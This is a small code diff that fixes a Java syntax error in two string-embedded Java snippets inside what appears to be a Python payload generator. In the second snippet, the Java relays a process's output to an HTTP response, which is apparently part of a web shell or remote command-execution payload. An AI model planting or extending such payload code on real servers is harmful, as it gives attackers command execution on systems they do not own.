@@ -19,7 +19,7 @@ code = """
         }
         java.util.Scanner i = new java.util.Scanner(process.getInputStream())
             .useDelimiter("\\\\A");
-        java.util.Scanner e = java.util.new Scanner(process.getErrorStream())
+        java.util.Scanner e = new java.util.Scanner(process.getErrorStream())
             .useDelimiter("\\\\A");
         String result = i.hasNext()?i.next():e.hasNext()?e.next():"";
         try {
@@ -45,7 +45,7 @@ proc = """
             }
             java.util.Scanner i = new java.util.Scanner(process.getInputStream())
                 .useDelimiter("\\\\A");
-            java.util.Scanner e = java.util.new Scanner(process.getErrorStream())
+            java.util.Scanner e = new java.util.Scanner(process.getErrorStream())
                 .useDelimiter("\\\\A");
             String result = i.hasNext()?i.next():e.hasNext()?e.next():"";
             res.getWriter().write(result);
